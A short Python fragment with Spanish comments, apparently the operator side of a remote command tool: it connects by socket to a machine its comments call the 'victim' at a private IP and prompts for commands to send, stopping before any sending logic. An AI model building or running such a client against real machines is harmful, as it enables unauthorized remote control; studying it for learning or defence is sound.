from socket import socket


# Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
server_address = ('192.168.6.38', 5000)

# Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
client_socket = socket()
client_socket.connect(server_address)
estado = True

while estado:

    # Solicitamos al usuario que introduzca un comando
    comando_enviar = input("Introduce el comando que quieras enviar a la máquina víctima (o 'exit' para salir): ")